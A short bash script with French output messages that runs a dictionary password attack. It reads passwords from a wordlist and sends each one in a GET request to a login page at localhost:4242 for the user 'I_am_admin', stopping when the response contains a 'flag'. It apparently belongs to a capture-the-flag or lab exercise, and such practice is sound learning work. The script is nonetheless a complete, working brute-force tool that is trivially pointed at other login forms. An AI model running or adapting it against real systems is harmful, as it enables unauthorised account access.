#!/bin/bash

ip_address="localhost:4242"

password_file="wordlist.txt"

while read password

do
    echo "Test du mot de passe : $password"

	result=$(curl -s "http://$ip_address/index.php?page=signin&username=I_am_admin&password=$password&Login=Login")

    if echo "$result" | grep -q "flag"; then
        echo "Mot de passe trouvé : $password"
        echo "$result"
        exit 0
    fi

done < "$password_file"

echo "Aucun mot de passe valide trouvé dans la liste."
